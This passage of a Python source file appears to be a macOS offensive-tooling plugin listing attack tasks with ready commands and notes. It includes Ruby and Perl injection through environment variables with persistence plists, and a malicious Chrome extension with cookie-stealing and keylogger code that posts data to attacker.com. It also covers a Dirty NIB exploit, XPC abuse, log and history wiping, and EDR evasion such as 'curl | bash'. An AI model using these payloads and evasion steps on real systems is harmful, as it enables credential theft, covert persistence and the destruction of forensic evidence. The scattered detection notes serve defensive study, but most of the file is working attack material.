# Create /tmp/malicious_gem.rb
# Script does: require 'malicious_gem'

PAYLOAD EXAMPLE:
# /tmp/payload.rb
require 'open3'
Open3.capture3('/Applications/Calculator.app/Contents/MacOS/Calculator')

PERSISTENCE PLIST:
<dict>
    <key>EnvironmentVariables</key>
    <dict>
        <key>RUBYOPT</key>
        <string>-r/Users/Shared/.payload.rb</string>
    </dict>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/ruby</string>
        <string>/path/to/script.rb</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>

HOMEBREW RUBY HIJACK:
sudo mv /opt/homebrew/bin/ruby /opt/homebrew/bin/ruby.original

#!/bin/bash wrapper...

GEM POISONING:
Find gem location:
gem environment

Modify gem file:
/opt/homebrew/lib/ruby/gems/3.2.0/gems/rails-7.0.0/lib/rails.rb

Add at top:
exec '/Applications/Calculator.app/Contents/MacOS/Calculator'

LIMITATIONS:
- RUBYOPT ignored in some restricted environments
- Must target Ruby apps or scripts
- Less common than Python/Java on macOS

TIME ESTIMATE: 2-3 minutes
                        '''
                    }
                },

                # PERL
                {
                    'id': 'perl-injection-env-vars',
                    'name': 'Perl Injection via Environment Variables',
                    'type': 'command',
                    'metadata': {
                        'command': 'export PERL5OPT="-Mlib=/tmp" && echo \'package payload;\nexec "/Applications/Calculator.app/Contents/MacOS/Calculator";\n1;\' > /tmp/payload.pm',
                        'description': 'Inject malicious Perl code via PERL5OPT environment variable',
                        'tags': ['OSCP:LOW', 'PERL', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            'PERL5OPT': 'Perl options environment variable',
                            '-M module': 'Load module before executing script',
                            '-I /dir': 'Add /dir to Perl library search path (@INC)',
                            'package name;': 'Declare Perl package',
                            '1;': 'Return true (required for Perl modules)'
                        },
                        'success_indicators': [
                            'PERL5OPT set correctly',
                            'Module loaded before script execution',
                            'Payload executes'
                        ],
                        'failure_indicators': [
                            'Perl ignores PERL5OPT',
                            'Module not found in search path',
                            'Syntax errors'
                        ],
                        'next_steps': [
                            'Find Perl scripts: find /Applications -name "*.pl" -o -name "*.pm"',
                            'Test: perl -e "print \\"test\\\\n\\""',
                            'Target system Perl: /usr/bin/perl',
                            'Combine with PERLLIB for module path'
                        ],
                        'alternatives': [
                            'PERLLIB env var: export PERLLIB=/tmp:$PERLLIB',
                            'PERL5LIB env var: export PERL5LIB=/tmp',
                            'Modify @INC in script: use lib "/tmp";',
                            'System Perl module poisoning: /Library/Perl/X.X'
                        ],
                        'notes': '''
PERL ENVIRONMENT VARIABLES:

PERL5OPT:
export PERL5OPT="-Mpayload"
# Requires payload.pm in @INC path

PERLLIB / PERL5LIB:
export PERL5LIB=/tmp
# Add /tmp to module search path

COMBINED:
export PERL5LIB=/tmp
export PERL5OPT="-Mpayload"
echo 'package payload; exec "/calc"; 1;' > /tmp/payload.pm

PAYLOAD MODULE:
# payload.pm
package payload;

use strict;
use warnings;

# Payload executes when module loaded
system('/Applications/Calculator.app/Contents/MacOS/Calculator &');

1; # Required return value

SYSTEM PERL MODULE POISONING:
Find Perl lib directory:
perl -V

Add to:
/Library/Perl/5.30/payload.pm

Or modify existing module:
/Library/Perl/5.30/darwin-thread-multi-2level/warnings.pm

PERSISTENCE:
<dict>
    <key>EnvironmentVariables</key>
    <dict>
        <key>PERL5LIB</key>
        <string>/Users/Shared/.hidden</string>
        <key>PERL5OPT</key>
        <string>-Mpayload</string>
    </dict>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/perl</string>
        <string>/path/to/script.pl</string>
    </array>
</dict>

LIMITATIONS:
- Perl less common on modern macOS
- System Perl often not used by apps
- Requires finding Perl-based apps

DETECTION:
- Monitor PERL5OPT/PERL5LIB in environment
- File integrity on /Library/Perl

TIME ESTIMATE: 2-3 minutes (if Perl apps present)
                        '''
                    }
                }
            ]
        }

    # ==================== CHROMIUM INJECTION ====================

    def _create_chromium_injection_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for Chromium-based browser injection"""
        return {
            'id': 'chromium-injection-parent',
            'name': 'Chromium Browser Injection',
            'type': 'parent',
            'children': [
                # Task 1: Load malicious extension
                {
                    'id': 'chromium-load-extension',
                    'name': 'Chromium --load-extension Injection',
                    'type': 'command',
                    'metadata': {
                        'command': 'mkdir -p /tmp/evil-ext && echo \'{"manifest_version": 3, "name": "Evil", "version": "1.0", "permissions": ["tabs", "webRequest", "cookies", "storage"], "background": {"service_worker": "background.js"}}\' > /tmp/evil-ext/manifest.json',
                        'description': 'Create malicious Chrome extension for injection via --load-extension',
                        'tags': ['OSCP:MEDIUM', 'CHROMIUM', 'CODE_INJECTION', 'MANUAL'],
                        'flag_explanations': {
                            '--load-extension': 'Load unpacked extension from directory',
                            '--use-fake-ui-for-media-stream': 'Auto-grant camera/mic permissions',
                            'manifest_version: 3': 'Manifest V3 (Chrome 88+)',
                            'permissions': 'Extension permissions (tabs, cookies, etc.)'
                        },
                        'success_indicators': [
                            'Extension loads without errors',
                            'Access to tabs, cookies, web requests',
                            'Can intercept/modify traffic'
                        ],
                        'failure_indicators': [
                            'Extension load error (invalid manifest)',
                            'Permission denied',
                            'Chrome in safe mode'
                        ],
                        'next_steps': [
                            'Create background.js with payload',
                            'Launch: /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --load-extension=/tmp/evil-ext',
                            'Add --use-fake-ui-for-media-stream for auto camera/mic access',
                            'Steal cookies: chrome.cookies.getAll({})',
                            'Intercept requests: chrome.webRequest.onBeforeRequest.addListener()'
                        ],
                        'alternatives': [
                            'VOODOO tool: https://github.com/breakpointHQ/VOODOO',
                            'Snoop tool: https://github.com/breakpointHQ/snoop',
                            'Manual: voodoo intercept -b chrome',
                            'Brave/Edge/Vivaldi: Same flags work (Chromium-based)'
                        ],
                        'notes': '''
MALICIOUS CHROME EXTENSION:

MANIFEST.JSON:
{
  "manifest_version": 3,
  "name": "Traffic Interceptor",
  "version": "1.0",
  "permissions": [
    "tabs",
    "webRequest",
    "cookies",
    "storage",
    "scripting"
  ],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  }
}

BACKGROUND.JS (Payload):
// Steal all cookies
chrome.cookies.getAll({}, (cookies) => {
  fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(cookies)
  });
});

// Intercept web requests
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(details)
    });
  },
  {urls: ["<all_urls>"]},
  ["requestBody"]
);

// Inject keylogger
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    chrome.scripting.executeScript({
      target: {tabId: tabId},
      files: ['keylogger.js']
    });
  }
});

KEYLOGGER.JS:
document.addEventListener('keydown', (e) => {
  fetch('https://attacker.com/keys', {
    method: 'POST',
    body: e.key + ' - ' + window.location.href
  });
});

LAUNCH:
/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome \\
  --load-extension=/tmp/evil-ext \\
  --use-fake-ui-for-media-stream \\
  --disable-web-security

FLAGS:
--load-extension: Load unpacked extension
--use-fake-ui-for-media-stream: Auto-grant camera/mic (no prompt)
--disable-web-security: Disable same-origin policy
--user-data-dir=/tmp/chrome-data: Custom profile (avoid existing)

PERSISTENCE PLIST:
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Google Chrome.app/Contents/MacOS/Google Chrome</string>
        <string>--load-extension=/Users/Shared/.chrome-ext</string>
        <string>--use-fake-ui-for-media-stream</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>

CHROMIUM BROWSERS:
- Google Chrome
- Microsoft Edge
- Brave
- Vivaldi
- Opera

TOOLS:
- VOODOO: Automated MitB framework
- Snoop: Traffic interception tool

TIME ESTIMATE: 5-10 minutes
                        '''
                    }
                }
            ]
        }

    # ==================== NIB FILE ABUSE ====================

    def _create_nib_abuse_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for NIB/XIB file abuse (Dirty NIB)"""
        return {
            'id': 'nib-abuse-parent',
            'name': 'NIB File Abuse (Dirty NIB)',
            'type': 'parent',
            'children': [
                # Task 1: Enumerate NIB-based apps
                {
                    'id': 'nib-enumerate-apps',
                    'name': 'Enumerate Applications Using NIB Files',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Applications -maxdepth 2 -name Info.plist -exec sh -c \'if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$1" >/dev/null 2>&1; then echo "[NIB] $(dirname "$1") uses NSMainNibFile=$(/usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$1")"; fi\' sh {} \\;',
                        'description': 'Find applications that load NIB files at startup (vulnerable to Dirty NIB)',
                        'tags': ['OSCP:MEDIUM', 'MACOS', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            'NSMainNibFile': 'Info.plist key specifying main NIB file to load',
                            'PlistBuddy': 'Command-line tool for plist manipulation',
                            '-c "Print :NSMainNibFile"': 'Print value of NSMainNibFile key'
                        },
                        'success_indicators': [
                            '[NIB] prefix showing vulnerable apps',
                            'NSMainNibFile value displayed (usually "MainMenu")'
                        ],
                        'failure_indicators': [
                            'No NIB-based apps found',
                            'Permission denied on /Applications'
                        ],
                        'next_steps': [
                            'Locate NIB file: find APP.app -name "*.nib"',
                            'Check bundle protection: codesign -dv --verbose=4 APP.app',
                            'Test modification: Copy app to /tmp, modify NIB, execute',
                            'Check macOS version: Ventura+ has bundle protection and Launch Constraints'
                        ],
                        'alternatives': [
                            'Find all NIBs: find /Applications -name "*.nib" -o -name "*.xib"',
                            'Check specific app: /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" APP.app/Contents/Info.plist',
                            'List NIB objects: plutil -p APP.app/Contents/Resources/MainMenu.nib/keyedobjects.nib'
                        ],
                        'notes': '''
DIRTY NIB TECHNIQUE:

VULNERABILITY:
Pre-macOS 13 Ventura:
- Apps load MainMenu.nib from NSMainNibFile key
- NIB loading instantiates arbitrary Objective-C classes
- Cocoa Bindings can auto-trigger method calls
- No NSSecureCoding check, no signature verification on NIBs

ATTACK FLOW:
1. Copy app bundle to writable location (/tmp)
2. Create malicious .xib file
3. Compile to .nib: ibtool malicious.xib --compile malicious.nib
4. Replace Contents/Resources/MainMenu.nib
5. Execute app -> NIB loads -> Auto-trigger payload

MODERN MACOS PROTECTIONS (Ventura 13+, Sonoma 14+):
- First-launch deep signature check (covers all resources)
- Bundle protection: Only same developer can modify app bundle
- TCC "App Management" permission required for cross-app modification
- Launch Constraints: Apple apps can't run from non-standard locations

BYPASS:
- Requires TCC "App Management" or "Full Disk Access"
- Terminal/shells with these permissions can modify bundles
- Developer tools (Xcode) signed by same Team ID
- Pre-Ventura systems (macOS ≤12)

EXAMPLE MALICIOUS XIB:
<objects>
  <customObject id="A1" customClass="NSAppleScript"/>
  <textField id="A2" title="display dialog \\"PWNED\\""/>

  <!-- Auto-trigger chain -->
  <menuItem id="C1">
    <connections>
      <binding name="target" destination="A1"/>
      <binding name="selector" keyPath="initWithSource:"/>
      <binding name="Argument" destination="A2" keyPath="title"/>
    </connections>
  </menuItem>

  <menuItem id="C2">
    <connections>
      <binding name="target" destination="A1"/>
      <binding name="selector" keyPath="executeAndReturnError:"/>
    </connections>
  </menuItem>

  <!-- Triggers -->
  <menuItem id="T1">
    <connections>
      <binding keyPath="_corePerformAction" destination="C1"/>
    </connections>
  </menuItem>

  <menuItem id="T2">
    <connections>
      <binding keyPath="_corePerformAction" destination="C2"/>
    </connections>
  </menuItem>
</objects>

GADGET CLASSES:
- NSAppleScript: Execute AppleScript
- NSTask: Launch processes (older macOS)
- Custom app classes via class-dump

DETECTION:
- File integrity monitoring on .nib files
- Monitor TCC App Management permission grants
- log stream --predicate 'eventMessage CONTAINS "AppleScript" AND processImagePath CONTAINS ".app"'
- codesign --verify --deep on critical apps

LIMITATIONS (Modern macOS):
- Requires privileged context (App Management/FDA)
- Apple apps blocked by Launch Constraints
- First-launch verification prevents modification after install
- Not viable for remote exploitation (needs local access)

HISTORICAL CVE:
- Pre-Ventura: Widespread vulnerability
- Ventura+: Largely mitigated

TIME ESTIMATE: 10-15 minutes (if vulnerable system)
                        '''
                    }
                }
            ]
        }

    # ==================== IPC ABUSE ====================

    def _create_ipc_abuse_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for IPC (XPC, Mach ports) abuse"""
        return {
            'id': 'ipc-abuse-parent',
            'name': 'Inter-Process Communication (IPC) Abuse',
            'type': 'parent',
            'children': [
                # Task 1: Enumerate XPC services
                {
                    'id': 'xpc-enumerate-services',
                    'name': 'Enumerate XPC Services',
                    'type': 'command',
                    'metadata': {
                        'command': 'find /Applications -name "*.app" 2>/dev/null | while read app; do find "$app" -name "*.xpc" 2>/dev/null | while read xpc; do echo "[XPC] $xpc"; codesign -dv --entitlements :- "$xpc/Contents/MacOS/"* 2>&1 | grep -A5 "com.apple.security"; done; done',
                        'description': 'Enumerate XPC services and their entitlements for privilege escalation',
                        'tags': ['OSCP:HIGH', 'MACOS', 'ENUM', 'MANUAL'],
                        'flag_explanations': {
                            '.xpc bundle': 'XPC service bundle (helper tool)',
                            'codesign --entitlements': 'Display embedded entitlements',
                            'com.apple.security': 'Security-related entitlements'
                        },
                        'success_indicators': [
                            '[XPC] prefix showing XPC services',
                            'Entitlements displayed',
                            'Services with elevated privileges found'
                        ],
                        'failure_indicators': [
                            'No XPC services found',
                            'Permission denied reading bundles'
                        ],
                        'next_steps': [
                            'Check for weak validation: Look for services without connection validation',
                            'Analyze protocol: class-dump XPC_SERVICE',
                            'Test connection: xpcutil connect SERVICE_NAME',
                            'Look for insecure deserialization, path traversal, command injection'
                        ],
                        'alternatives': [
                            'System XPC services: find /System/Library -name "*.xpc"',
                            'LaunchDaemons XPC: cat /System/Library/LaunchDaemons/*.plist | grep MachServices',
                            'Process XPC connections: lsof -p PID | grep -i xpc'
                        ],
                        'notes': '''
XPC (CROSS-PROCESS COMMUNICATION):

XPC is macOS IPC mechanism for privilege separation.
Apps split into main app + helper XPC services.
XPC services often run with elevated privileges.

VULNERABILITY CLASSES:

1. Missing Connection Validation:
   - XPC service doesn't check connecting process
   - Any process can send messages
   - Exploit: Send malicious messages to privileged service

2. Insecure Deserialization:
   - XPC accepts NSCoding objects without validation
   - Attacker sends malicious object
   - Code execution when deserialized

3. Path Traversal:
   - XPC service performs file operations
   - No path sanitization
   - Exploit: Read/write arbitrary files with service privileges

4. Command Injection:
   - XPC passes user input to system()
   - No sanitization
   - Exploit: Inject shell commands

ENUMERATE XPC SERVICES:
# In app bundle
find APP.app -name "*.xpc"

# System-wide
find /System/Library -name "*.xpc"
find /Library/PrivilegedHelperTools -type f

# Running services
launchctl list | grep -i xpc

CHECK ENTITLEMENTS:
codesign -dv --entitlements :- SERVICE.xpc

Look for:
- com.apple.private.*
- com.apple.security.cs.disable-library-validation
- com.apple.rootless.install.heritable

ANALYZE PROTOCOL:
class-dump SERVICE.xpc/Contents/MacOS/SERVICE

Find protocol definition:
@protocol ServiceProtocol
- (void)doSomethingWithPath:(NSString *)path;
@end

CONNECT TO XPC:
#import <Foundation/Foundation.h>

NSXPCConnection *connection = [[NSXPCConnection alloc]
    initWithServiceName:@"com.company.service"];
connection.remoteObjectInterface = [NSXPCInterface
    interfaceWithProtocol:@protocol(ServiceProtocol)];
[connection resume];

id<ServiceProtocol> service = [connection remoteObjectProxy];
[service doSomethingWithPath:@"/etc/passwd"];

COMMON VULNERABILITIES:
CVE-2021-30724: TCC bypass via XPC
CVE-2020-27937: macOS XPC privilege escalation
CVE-2019-8561: Gatekeeper bypass via XPC

TOOLS:
- xpcspy: Monitor XPC messages
- xpcdump: Dump XPC protocol
- xpc_connection_get_audit_token(): Get caller audit token (for validation)

PID REUSE ATTACK:
XPC checks PID of connecting process
Attacker starts process, gets PID
XPC service stores PID
Attacker kills process
Attacker creates new process with same PID (reused)
Bypasses PID-based validation

PROPER VALIDATION:
Use audit tokens, not PIDs:
audit_token_t token;
xpc_connection_get_audit_token(connection, &token);
// Check code signature of token

TIME ESTIMATE: 15-20 minutes
                        '''
                    }
                }
            ]
        }

    # ==================== DETECTION & EVASION ====================

    def _create_detection_evasion_tasks(self, target: str) -> Dict[str, Any]:
        """Tasks for detection and defense evasion"""
        return {
            'id': 'detection-evasion-parent',
            'name': 'Detection Evasion & Anti-Forensics',
            'type': 'parent',
            'children': [
                # Task 1: Clear unified logs
                {
                    'id': 'clear-unified-logs',
                    'name': 'Clear Unified Logs (Anti-Forensics)',
                    'type': 'command',
                    'metadata': {
                        'command': 'sudo log erase --all 2>&1 || echo "Requires sudo; Alternative: Clear ~/.zsh_history, ~/.bash_history"',
                        'description': 'Erase unified system logs to remove evidence of injection activities',
                        'tags': ['OSCP:LOW', 'MACOS', 'ANTI_FORENSICS', 'MANUAL'],
                        'flag_explanations': {
                            'log erase': 'Unified logging erase command',
                            '--all': 'Erase all logs (not just current)'
                        },
                        'success_indicators': [
                            'Logs erased message',
                            'log show returns empty results'
                        ],
                        'failure_indicators': [
                            'Permission denied (requires root)',
                            'SIP prevents log erasure'
                        ],
                        'next_steps': [
                            'Clear shell history: rm ~/.zsh_history ~/.bash_history',
                            'Clear recent files: rm ~/Library/Application\\ Support/com.apple.sharedfilelist/*.sfl*',
                            'Clear LaunchServices: /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill',
                            'Remove persistence artifacts: launchctl unload PLIST && rm PLIST'
                        ],
                        'alternatives': [
                            'Selective clear: sudo log erase --predicate \'eventMessage CONTAINS "keyword"\'',
                            'Individual log: sudo rm /var/log/system.log*',
                            'Clear user logs: rm ~/Library/Logs/*'
                        ],
                        'notes': '''
ANTI-FORENSICS CHECKLIST:

1. UNIFIED LOGS:
sudo log erase --all

2. SHELL HISTORY:
rm ~/.zsh_history ~/.bash_history ~/.sh_history

3. RECENT FILES:
rm ~/Library/Application Support/com.apple.sharedfilelist/*.sfl*

4. LAUNCHSERVICES DATABASE:
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill -r -domain local -domain system -domain user

5. PERSISTENCE ARTIFACTS:
launchctl unload ~/Library/LaunchAgents/*.plist
rm ~/Library/LaunchAgents/*.plist

6. MODIFIED APPS:
rm -rf /tmp/modified_apps/
codesign -f -s - APP.app (re-sign to remove signature changes)

7. NETWORK CONNECTIONS:
Clear DNS cache: sudo dscacheutil -flushcache

8. QUARANTINE ATTRIBUTES:
xattr -d com.apple.quarantine FILE

9. SPOTLIGHT INDEX:
sudo mdutil -E /

10. TIME MACHINE:
Exclude: sudo tmutil addexclusion /path/to/file

LIMITATIONS:
- SIP may prevent some log clearing
- EDR/MDM solutions may export logs remotely
- Disk forensics can recover deleted files

OPSEC:
- Clear logs immediately after activity
- Use memory-only payloads when possible
- Disable crash reports: launchctl unload -w /System/Library/LaunchAgents/com.apple.ReportCrash.plist
                        '''
                    }
                },

                # Task 2: Evade EndpointSecurity monitoring
                {
                    'id': 'evade-endpointsecurity',
                    'name': 'EndpointSecurity Evasion Techniques',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Techniques to evade EndpointSecurity framework monitoring',
                        'tags': ['OSCP:LOW', 'MACOS', 'EVASION', 'MANUAL'],
                        'alternatives': [
                            'Use existing processes: Don\'t spawn new processes',
                            'Thread hijacking: Reuse threads, don\'t create new ones',
                            'In-memory execution: Avoid writing files to disk',
                            'Time delays: Slow operations to evade behavior detection',
                            'Legitimate tools: Use built-in macOS tools (not suspicious binaries)'
                        ],
                        'notes': r'''
ENDPOINTSECURITY FRAMEWORK:

MONITORED EVENTS:
- ES_EVENT_TYPE_AUTH_EXEC: Process execution
- ES_EVENT_TYPE_AUTH_OPEN: File opens
- ES_EVENT_TYPE_AUTH_GET_TASK: task_for_pid() calls
- ES_EVENT_TYPE_NOTIFY_REMOTE_THREAD_CREATE: Thread injection
- ES_EVENT_TYPE_NOTIFY_THREAD_SET_STATE: Register manipulation (macOS 14+)

EVASION TECHNIQUES:

1. USE EXISTING PROCESSES:
   - Don't exec() new binaries
   - Inject into running process
   - Use dylib injection instead of new process

2. THREAD HIJACKING (not new threads):
   - Reuse existing threads
   - thread_create_running() generates REMOTE_THREAD_CREATE event
   - thread_suspend/set_state/resume harder to detect

3. IN-MEMORY EXECUTION:
   - Don't write to disk
   - Load libraries from memory
   - Use mmap() for shellcode, not files

4. TIME-DELAYED OPERATIONS:
   - Behavior detection looks for rapid sequences
   - Add sleep() between operations
   - Spread activity over time

5. LEGITIMATE TOOL ABUSE (LOLBINS):
   - python -c "import os; os.system('/bin/bash')"
   - osascript -e 'do shell script "PAYLOAD"'
   - ruby -e 'exec "/bin/bash"'
   - perl -e 'exec "/bin/bash"'

6. APPLE-SIGNED BINARIES:
   - curl | bash (download & execute)
   - /usr/bin/open --env VAR=VAL APP.app
   - launchctl submit -l JOB -- COMMAND

7. DISABLE REPORTING:
   - launchctl unload /System/Library/LaunchAgents/com.apple.ReportCrash.plist (crash reports)
   - sudo launchctl unload /System/Library/LaunchDaemons/com.apple.spindump.plist (spindump)

ES CLIENT ENUMERATION:
No public API to list ES clients, but:
- Check running processes for ES clients
- Common EDR: CrowdStrike, SentinelOne, Carbon Black
- ps aux | grep -i "crowdstrike\|sentinelone\|carbon"

ES LIMITATIONS:
- Can't monitor kernel operations
- Can't see direct memory manipulation
- In-process activity (no exec) less visible

OSQUERY DETECTION:
SELECT * FROM es_process_events WHERE event_type = 'REMOTE_THREAD_CREATE';

SUMMARY:
Best evasion: Inject into existing process, manipulate memory, no new processes/threads
                        '''
                    }
                }
            ]
        }


# Export
__all__ = ['MacOSProcessAbusePlugin']
